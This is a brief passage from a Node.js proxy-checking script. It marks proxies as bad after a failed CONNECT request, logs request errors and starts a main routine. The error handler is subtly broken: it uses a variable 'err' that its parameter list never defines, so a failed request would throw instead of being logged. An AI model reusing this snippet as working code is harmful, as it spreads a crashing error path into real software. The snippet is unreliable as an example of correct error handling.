      markProxyAsBad(proxy, `CONNECT status=${_res.statusCode}`, infoData);
    }
  });
  req.on("error", () => {
  	console.error(proxy,`CONNECT request error => ${err.message}`.red);
  });
  req.end();
}
startMain();